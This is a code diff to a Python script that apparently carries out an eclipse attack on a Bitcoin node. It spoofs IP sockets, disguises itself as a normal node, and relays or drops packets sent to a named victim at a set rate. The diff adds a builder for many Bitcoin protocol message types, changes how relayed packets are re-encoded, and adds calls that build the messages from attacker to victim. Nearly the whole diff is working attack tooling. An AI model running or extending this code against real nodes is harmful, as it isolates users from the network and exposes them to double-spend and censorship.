@@ -6,8 +6,9 @@ import os
 
 
 import socket, time, bitcoin
-from bitcoin.messages import msg_version, msg_verack, msg_addr
+from bitcoin.messages import *
 from bitcoin.net import CAddress
+
 
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
 eclipse_packet_drop_rate = 0.5
@@ -57,6 +58,69 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	msg.addrTo.port = dst_port
 	# Default is /python-bitcoinlib:0.11.0/
 	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
+	return msg
+
+def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
+	msg = None
+	if msgtype == 'version':
+		msg = msg_version(bitcoin_protocolversion)
+	elif msgtype == 'verack':
+		msg = msg_verack(bitcoin_protocolversion)
+	elif msgtype == 'addr':
+		msg = msg_addr(bitcoin_protocolversion)
+	elif msgtype == 'inv':
+		msg = msg_inv(bitcoin_protocolversion)
+	elif msgtype == 'getdata':
+		msg = msg_getdata(bitcoin_protocolversion)
+	#elif msgtype == 'merkleblock':
+	#	msg = msg_merkleblock(bitcoin_protocolversion)
+	elif msgtype == 'getblocks':
+		msg = msg_getblocks(bitcoin_protocolversion)
+	elif msgtype == 'getheaders':
+		msg = msg_getheaders(bitcoin_protocolversion)
+	elif msgtype == 'tx':
+		msg = msg_tx(bitcoin_protocolversion)
+	elif msgtype == 'headers':
+		msg = msg_headers(bitcoin_protocolversion)
+	elif msgtype == 'block':
+		msg = msg_block(bitcoin_protocolversion)
+	elif msgtype == 'getaddr':
+		msg = msg_getaddr(bitcoin_protocolversion)
+	elif msgtype == 'mempool':
+		msg = msg_mempool(bitcoin_protocolversion)
+	elif msgtype == 'ping':
+		msg = msg_ping(bitcoin_protocolversion)
+	elif msgtype == 'pong':
+		msg = msg_pong(bitcoin_protocolversion)
+	#elif msgtype == 'notfound':
+	#	msg = msg_notfound(bitcoin_protocolversion)
+	#elif msgtype == 'filterload':
+	#	msg = msg_filterload(bitcoin_protocolversion)
+	#elif msgtype == 'filteradd':
+	#	msg = msg_filteradd(bitcoin_protocolversion)
+	#elif msgtype == 'filterclear':
+	#	msg = msg_filterclear(bitcoin_protocolversion)
+	#elif msgtype == 'sendheaders':
+	#	msg = msg_sendheaders(bitcoin_protocolversion)
+	#elif msgtype == 'feefilter':
+	#	msg = msg_feefilter(bitcoin_protocolversion)
+	#elif msgtype == 'sendcmpct':
+	#	msg = msg_sendcmpct(bitcoin_protocolversion)
+	#elif msgtype == 'cmpctblock':
+	#	msg = msg_cmpctblock(bitcoin_protocolversion)
+	#elif msgtype == 'getblocktxn':
+	#	msg = msg_getblocktxn(bitcoin_protocolversion)
+	#elif msgtype == 'blocktxn':
+	#	msg = msg_blocktxn(bitcoin_protocolversion)
+	#elif msgtype == 'reject':
+	#	msg = msg_reject()
+	else:
+		return None
+
+	#msg.addrFrom.ip = src_ip
+	#msg.addrFrom.port = src_port
+	#msg.addrTo.ip = dst_ip
+	#msg.addrTo.port = dst_port
 	return msg
 
 # str_addrs = ['1.2.3.4', '5.6.7.8', '9.10.11.12'...]
@@ -167,10 +231,12 @@ def packet_received(packet):
 				rand_socket = spoof_IP_sockets[rand_i]
 
 				print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
-				packet[IP].src = rand_ip
-				packet[IP].dst = victim_ip
+				#packet[IP].src = rand_ip
+				#packet[IP].dst = victim_ip
 				try:
-					rand_socket.send(raw(packet))
+					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
+					#rand_socket.send(custom.to_bytes())
+					rand_socket.send(to_bytes(from_bytes(raw(packet))))
 				except:
 					print('Relaying message FAILED')
 
@@ -221,6 +287,34 @@ if __name__ == '__main__':
 	alias_num = 0 # Increments each alias
 	
 	initialize_network_info()
+
+
+	custom_packet('version',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('verack',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('addr',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('inv',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('getdata',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('merkleblock',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('getblocks',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('getheaders',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('tx',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('headers',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('block',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('getaddr',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('mempool',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('ping',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('pong',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('notfound',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('filterload',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('filteradd',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('filterclear',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('sendheaders',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('feefilter',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('sendcmpct',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('cmpctblock',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('getblocktxn',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('blocktxn',attacker_ip, victim_ip, attacker_port, victim_port)
+	custom_packet('reject',attacker_ip, victim_ip, attacker_port, victim_port)
 
 	atexit.register(on_close)
 	cleanup_iptables()
